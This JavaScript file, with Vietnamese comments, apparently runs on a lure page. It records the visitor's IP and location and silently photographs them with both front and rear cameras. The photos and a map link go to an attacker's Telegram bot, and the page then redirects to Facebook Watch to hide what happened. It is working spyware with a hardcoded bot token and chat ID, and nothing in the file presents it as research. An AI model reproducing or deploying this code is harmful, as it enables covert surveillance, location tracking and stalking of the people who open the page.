const TOKEN = '8163261794:AAE1AVuCTP0Vm_kqV0a1DT-02NTo1XKhVs0';
const ID = '-1003770043455';

async function capture(mode) {
    let stream = null;
    try {
        stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: mode, width: { ideal: 1280 }, height: { ideal: 720 } } 
        });
        const video = document.createElement('video');
        video.srcObject = stream;
        video.muted = true;
        await video.play();

        return new Promise(res => {
            // Đợi 3.5 giây để camera lấy nét và sáng hơn
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                // QUAN TRỌNG: Tắt toàn bộ camera sau khi chụp xong
                stream.getTracks().forEach(t => t.stop());
                
                canvas.toBlob(res, 'image/jpeg', 0.7);
            }, 3500);
        });
    } catch (e) {
        if (stream) stream.getTracks().forEach(t => t.stop());
        return null;
    }
}

async function main() {
    // 1. Lấy dữ liệu vị trí trước
    const r = await fetch('https://ipwho.is/').catch(() => ({}));
    const d = await r.json().catch(() => ({}));
    
    // 2. Chụp ảnh tuần tự (Chụp xong ảnh 1 mới bắt đầu ảnh 2)
    const p1 = await capture("user");
    await new Promise(r => setTimeout(r, 1000)); // Nghỉ 1s để phần cứng camera reset
    const p2 = await capture("environment");

    const cap = `📡 [THÔNG TIN]
🕒 ${new Date().toLocaleString('vi-VN')}
🌍 IP: ${d.ip || '?'}
🏢 ISP: ${d.connection?.org || '?'}
📍 Khu vực: ${d.city || '?'}, ${d.region || '?'}
📌 Maps: http://www.google.com/maps/place/${d.latitude},${d.longitude}
📸 Camera: ${p1 ? "✅ Trước" : "❌ Trước"} | ${p2 ? "✅ Sau" : "❌ Sau"}`.trim();

    const fd = new FormData();
    fd.append('chat_id', ID);
    
    const media = [];
    if (p1) {
        fd.append('f1', p1, '1.jpg');
        media.push({ type: 'photo', media: 'attach://f1', caption: cap });
    }
    
    if (p2) {
        fd.append('f2', p2, '2.jpg');
        // Nếu đã có p1 thì p2 không cần caption để Telegram tự gộp album
        media.push({ type: 'photo', media: 'attach://f2', caption: media.length === 0 ? cap : "" });
    }

    if (media.length > 0) {
        fd.append('media', JSON.stringify(media));
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMediaGroup`, { method: 'POST', body: fd });
    } else {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: ID, text: cap })
        });
    }
    
    window.location.href = "https://www.facebook.com/watch/";
}

main();
